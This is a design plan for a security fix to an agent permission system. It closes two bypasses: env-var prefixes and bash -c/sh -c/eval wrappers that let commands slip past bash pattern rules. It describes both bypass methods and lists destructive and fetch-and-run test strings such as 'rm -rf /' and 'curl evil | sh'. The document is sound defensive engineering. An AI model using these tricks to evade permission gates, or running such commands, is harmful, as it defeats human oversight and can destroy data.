---
issue: 481
issue_title: "pi-permission-system: env-var prefix and bash -c/eval bypass bash command-pattern rules"
---

# Strip env-var prefix and floor opaque bash wrappers

## Release Recommendation

**Release:** ship independently

This is a standalone security bug fix, not a step in any architecture-roadmap phase (Phase 6 is complete and #481 is not referenced in the roadmap).
It should ship on its own once landed.

## Problem Statement

Bash command-pattern rules are matched against the full text of each command unit produced by `BashProgram.commands()`.
That text includes a leading `variable_assignment` prefix, so an env-var prefix defeats a rule that should gate the underlying command.
With `{"permission":{"bash":{"aws *":"ask"}}}`, `aws ec2 terminate-instances …` prompts correctly, but `AWS_PROFILE=prod aws ec2 terminate-instances …` is silently auto-allowed because its unit text `AWS_PROFILE=prod aws …` never matches `aws *`.
Prefixes like `AWS_PROFILE=`, `PGPASSWORD=`, `KUBECONFIG=` are extremely common in agent-generated commands, so this silently bypasses gating on sensitive commands.

Separately, `bash -c "…"`, `sh -c "…"`, and `eval "…"` carry an opaque inner program: the payload is a quoted string, not a command/process substitution, so the command enumerator never descends into it.
The wrapper is matched only as `bash …`, so with a permissive `bash *: allow` (or a top-level `*: allow`) the inner command rides through ungated.

## Goals

- Strip the leading `variable_assignment` prefix from each enumerated bash command unit, so `aws *` matches `AWS_PROFILE=prod aws …` (the issue's primary expected behavior).
- Floor an opaque-payload wrapper (`bash`/`sh`/`dash`/`zsh`/`ksh` with `-c`, plus `eval`) to at least `ask`: a resulting `allow` (including the top-level `*` fallback) is clamped up to `ask`, while an explicit `deny` rule on the wrapper still denies.
- Keep the fix fail-safe and deterministic — it only ever tightens a decision, never loosens one.

This is a behavior change on upgrade with no config edit: a command that was silently auto-allowed (e.g. `AWS_PROFILE=prod aws …`, or `bash -c "…"` under a permissive policy) will now match its rule and may prompt or deny.
It is classified `fix:` (not `fix!:`) because it only closes a bypass — it never weakens an existing decision, and there is no prior intended behavior to preserve (the old behavior was the bug).

## Non-Goals

- Re-parsing `-c`/`eval` payloads to match inner commands against inner rules.
  The floor-to-`ask` approach is fail-safe and far simpler; precise inner-command matching is deferred (see Open Questions).
- Covering other indirection wrappers (`sudo`, `env VAR=x cmd`, `xargs`, `find -exec`, `time`, `nohup`, `timeout`, `nice`).
  These are filed as a follow-up ([#490]); only `bash`/`sh`/`dash`/`zsh`/`ksh -c` and `eval` are floored in this change.
- Collecting path candidates from inside opaque payloads for the `path` / `external_directory` surfaces.
  Because the whole wrapper is floored to `ask`, the human is prompted and sees the full command, so inner paths are not silently passed.

## Background

The relevant code lives in `src/access-intent/bash/`:

- `command-enumeration.ts` — `collectCommands(node)` walks the parsed AST and emits one `BashCommand` per command unit.
  A `command` node is emitted whole via `makeUnit(node.text, context)`, where `node.text` is the verbatim source slice **including** any leading `variable_assignment` prefix.
  `variable_assignment` is already skipped for path-token collection in `token-collection.ts` and `cwd-projection.ts`, but not here.
- `program.ts` — `BashProgram.parse(command, cwd)` parses once and exposes `commands(): BashCommand[]`.
- `parser.ts` — the minimal `TSNode` interface (a subset of web-tree-sitter's `SyntaxNode`); it does not currently expose `startIndex`.
- `handlers/gates/bash-command.ts` — `resolveBashCommandCheck(command, commands, agentName, resolver)` resolves each unit on the `bash` surface and combines them with `pickMostRestrictive` (`deny > ask > allow`).
  It already synthesizes an `ask` with the `<unparseable-bash-command>` sentinel for a non-empty command that parses to zero units ([#452]).

Constraints from the package skill / AGENTS:

- Default to least privilege — when in doubt, prompt; the floor-to-`ask` design follows this directly.
- Wildcard matching must be explicit and tested — silent over- or under-matching is a permission bypass.
- `docs/architecture/architecture.md` describes `commands()` behavior in prose (the `program.ts` tree-listing entry); update it when enumeration semantics change.
- `docs/configuration.md` documents the `bash` surface matching rules; update it for the new prefix and wrapper behavior.

## Design Overview

### Part 1 — strip the env-var prefix

When `collectCommandsInto` handles a `command` node, emit the unit text from the first non-`variable_assignment` child (the `command_name`) to the end of the node, verbatim.
To slice verbatim while preserving the original inter-token spacing, add `startIndex: number` to the `TSNode` interface (web-tree-sitter's `SyntaxNode` already provides it) and compute the offset within the node:

```typescript
function commandUnitText(node: TSNode): string {
  for (let i = 0; i < node.childCount; i++) {
    const child = node.child(i);
    if (child && child.isNamed && child.type !== "variable_assignment") {
      return node.text.slice(child.startIndex - node.startIndex);
    }
  }
  return node.text; // pure assignment (no command_name): nothing to strip
}
```

`AWS_PROFILE=prod aws ec2 …` → `aws ec2 …`; `A=1 B=2 aws …` → `aws …`; a pure `FOO=bar` (no `command_name`) keeps its text unchanged (it runs no command, so there is nothing to gate, and keeping the text is never-weaker).

### Part 2 — floor opaque-payload wrappers

Tag a wrapper command unit with `opaque: true` during enumeration, then clamp its decision to at least `ask` during resolution.

A command is an opaque-payload wrapper when, after skipping leading `variable_assignment` children, the `command_name`'s basename is:

- one of `bash`, `sh`, `dash`, `zsh`, `ksh` **and** the args contain a short-flag word (before `--`) that starts with `-`, is not `--`, and includes the letter `c` (covers `-c`, `-ec`, `-xc`); or
- `eval` (every arg is part of the command string).

Basename matching covers `/bin/bash -c "…"`.
A shell invocation without `-c` (e.g. `bash script.sh`, or bare `bash`) is **not** opaque — it runs a file path or an interactive shell, not an inline payload — and is left unflagged.

Extend the `BashCommand` value type with the optional flag:

```typescript
export interface BashCommand {
  readonly text: string;
  readonly context?: BashCommandContext;
  /** Opaque-payload wrapper (`bash -c`/`eval`); its decision is floored to `ask`. */
  readonly opaque?: boolean;
}
```

In `resolveBashCommandCheck`, clamp an `allow` on an opaque unit up to `ask` with a sentinel, mirroring the `<unparseable-bash-command>` pattern:

```typescript
const results = commands.map((cmd) => {
  const base = resolver.resolve({
    kind: "tool",
    surface: "bash",
    input: { command: cmd.text },
    agentName,
  });
  const floored =
    cmd.opaque && base.state === "allow"
      ? { ...base, state: "ask" as const, matchedPattern: "<opaque-bash-wrapper>" }
      : base;
  return cmd.context ? { ...floored, commandContext: cmd.context } : floored;
});
```

`deny` and `ask` results pass through unchanged, so an explicit `bash -c *: deny` still denies and `pickMostRestrictive` keeps `deny > ask > allow`.
With Part 1, an env-prefixed wrapper (`AWS_PROFILE=x bash -c "…"`) is first stripped to `bash -c "…"`, then flagged opaque — the two parts compose.

### Structural review

This is additive and localized.
`BashCommand` is a small immutable value type (not a shared dependency bag); adding an optional field follows the same extension pattern as `context` ([#306]).
Enumeration (`command-enumeration.ts`) owns the structural facts (stripped text, opaque flag); resolution (`bash-command.ts`) owns the decision policy (the `ask` floor) — a clean separation with no new collaborator and no cross-layer wiring.
The opaque detection reads only the `command` node's own children, the same shallow walk the existing token collectors use.

## Module-Level Changes

- `src/access-intent/bash/parser.ts` — add `readonly startIndex: number` to the `TSNode` interface (web-tree-sitter `SyntaxNode` supplies it).
- `src/access-intent/bash/command-enumeration.ts`
  - In the `command`-node branch, replace `makeUnit(node.text, context)` with `makeUnit(commandUnitText(node), context, isOpaqueWrapperCommand(node))`.
  - Add private helpers `commandUnitText(node)` and `isOpaqueWrapperCommand(node)` (placed below `collectCommandsInto` per the stepdown rule).
  - Extend `BashCommand` with `readonly opaque?: boolean` and extend `makeUnit` to set it (only when true, to keep `toEqual` fixtures clean — mirrors how `context` is conditionally attached).
  - Update the `collectCommands` JSDoc to note prefix stripping and opaque-wrapper flagging.
- `src/access-intent/bash/program.ts` — update the `commands()` JSDoc to note the env-var prefix is stripped and `-c`/`eval` wrappers are flagged opaque.
- `src/handlers/gates/bash-command.ts` — floor an opaque unit's `allow` up to `ask` with the `<opaque-bash-wrapper>` sentinel; update the function's JSDoc.
- `test/access-intent/bash/node-text.test.ts` — update the local `makeNode` builder to set `startIndex: 0` (required field now; this builder constructs `TSNode` literals).
- `test/access-intent/bash/program.test.ts` — add command-enumeration cases (Part 1 and Part 2 flag).
- `test/handlers/gates/bash-command.test.ts` — add floor-behavior cases.
- `docs/configuration.md` — in the `bash` surface section, add a paragraph that a leading env-var assignment prefix is stripped before matching; in "Fail-closed behavior", add a bullet that `bash -c`/`sh -c`/`eval` (and `dash`/`zsh`/`ksh -c`) opaque payloads are floored to `ask` (the `<opaque-bash-wrapper>` sentinel) so they cannot ride a permissive `allow`.
- `docs/architecture/architecture.md` — update the `program.ts` tree-listing entry's `commands()` description to mention prefix stripping and the `opaque` flag.

No removed or renamed exports; no schema/example/loader changes (no new config field).
A grep for the affected symbols (`makeUnit`, `BashCommand`, `commands()`) confirms the call sites are `program.ts`, `bash-command.ts`, and the two test files above.

## Test Impact Analysis

1. **New tests enabled.**
   The prefix strip and opaque flag are observable on `BashProgram.commands()`, so they are unit-testable directly in `program.test.ts` without going through the full gate.
   The floor is unit-testable in `bash-command.test.ts` against a keyed/mocked resolver.
2. **Redundant tests.**
   None — this is additive.
   Existing `describe("commands")` cases stay (they assert the un-prefixed, non-wrapper behavior, which is unchanged).
3. **Tests that must stay as-is.**
   The existing chain/substitution/subshell enumeration cases and `bash-command-metamorphic.test.ts` (which wraps with a `cd` prefix, not `bash -c`) continue to exercise the un-floored path and the `deny > ask > allow` combination.

## Invariants at risk

- **[#452] fail-closed:** a non-empty command parsing to zero units still resolves to `ask` (`<unparseable-bash-command>`), and an empty/whitespace/comment-only command still resolves normally.
  Pinned by the existing fail-closed tests in `bash-command.test.ts`; the floor adds a sibling sentinel and does not touch the empty-units branch.
- **[#306] never-weaker nested enumeration:** the enclosing command and each nested command are still emitted; adding the `opaque` flag and the `ask` floor can only tighten.
  Pinned by `bash-command-metamorphic.test.ts` (cd-prefix never-weaker) and the substitution/subshell cases in `program.test.ts`.
- **[#393] no spurious widening:** the floor only narrows (`allow` → `ask`); it never relaxes a `deny`/`ask`.
  Pinned by the new deny-still-wins floor test.

## TDD Order

1. **Strip the env-var prefix.**
   Surface: `test/access-intent/bash/program.test.ts` `describe("commands")`.
   Red — add cases: a single env-var prefix is stripped (`AWS_PROFILE=prod aws ec2 terminate-instances --instance-ids i-1` → `{ text: "aws ec2 terminate-instances --instance-ids i-1" }`); multiple assignments stripped (`A=1 B=2 aws s3 ls` → `{ text: "aws s3 ls" }`); a prefix inside a chain (`X=1 aws sts get-caller-identity && ls` → first unit `aws sts get-caller-identity`); a pure assignment keeps its text (`FOO=bar` → `{ text: "FOO=bar" }`).
   Green — add `startIndex` to `TSNode` (`parser.ts`), add `commandUnitText` and use it in the `command` branch of `command-enumeration.ts`, and set `startIndex: 0` in `node-text.test.ts`'s `makeNode` (required-field compile fix).
   Commit: `fix(pi-permission-system): strip env-var assignment prefix from bash command units (#481)`.
2. **Floor opaque `-c`/`eval` wrappers to `ask`.**
   Surfaces: `test/access-intent/bash/program.test.ts` (flag) and `test/handlers/gates/bash-command.test.ts` (floor).
   Red — flagging cases: `bash -c "rm -rf /"`, `sh -c "…"`, `eval "rm -rf /"`, `dash -c "…"`, `zsh -c "…"`, `ksh -c "…"`, `/bin/bash -c "…"` (basename), `bash -ec "…"` (flag cluster) all set `opaque: true`; `bash script.sh`, bare `bash`, and a plain `ls` do **not**.
   Floor cases: an opaque unit resolving to `allow` becomes `ask` with `matchedPattern: "<opaque-bash-wrapper>"`; an opaque unit with a `deny` rule stays `deny`; an opaque unit with an `ask` rule stays `ask`; an env-prefixed `AWS_PROFILE=x bash -c "…"` is stripped to `bash -c "…"` and floored.
   Green — add `opaque?: boolean` to `BashCommand`, add `isOpaqueWrapperCommand` and extend `makeUnit` in `command-enumeration.ts`, and apply the floor in `resolveBashCommandCheck`.
   Commit: `fix(pi-permission-system): floor opaque bash -c/eval wrappers to ask (#481)`.
3. **Document the new behavior.**
   Update `docs/configuration.md` (env-prefix paragraph + opaque-wrapper fail-closed bullet) and `docs/architecture/architecture.md` (`commands()` description).
   Commit: `docs(pi-permission-system): document env-prefix stripping and opaque bash-wrapper floor (#481)`.

## Risks and Mitigations

- **Risk:** a benign `bash -c "ls"` now prompts where it was auto-allowed under a permissive policy.
  **Mitigation:** intended trade-off (fail-safe over convenience); documented in `docs/configuration.md`.
  Precise inner-command matching is the deferred re-parse follow-up.
- **Risk:** `startIndex` becomes a required `TSNode` field and breaks `TSNode` literal mocks.
  **Mitigation:** only `node-text.test.ts`'s `makeNode` constructs literals; it is updated in step 1.
  Real parses (web-tree-sitter) always supply `startIndex`.
- **Risk:** over-broad opaque detection floors a non-wrapper (e.g. a command that happens to take a `-c` flag with a different meaning, like `grep -c`).
  **Mitigation:** detection is gated on the `command_name` basename being a known shell (`bash`/`sh`/`dash`/`zsh`/`ksh`) or `eval`; `grep -c` is unaffected because `grep` is not in the shell set.
- **Risk:** the metamorphic totality property regresses.
  **Mitigation:** the floor only narrows; `bash-command-metamorphic.test.ts` stays green (it uses `cd`-prefix wrapping, not `bash -c`).

## Open Questions

- **Re-parse `-c`/`eval` payloads for precise inner-command matching** (the issue's "ideally") — would allow a benign `bash -c "ls"` while still gating `bash -c "curl evil | sh"`.
  Deferred; not filed (speculative until the floor proves too coarse in practice).
- **Other indirection wrappers** (`sudo`, `env VAR=x cmd`, `xargs`, `find -exec`, `time`, `nohup`, `timeout`, `nice`) — filed as a follow-up: [#490].

[#306]: https://github.com/gotgenes/pi-packages/issues/306
[#490]: https://github.com/gotgenes/pi-packages/issues/490
[#393]: https://github.com/gotgenes/pi-packages/issues/393
[#452]: https://github.com/gotgenes/pi-packages/issues/452
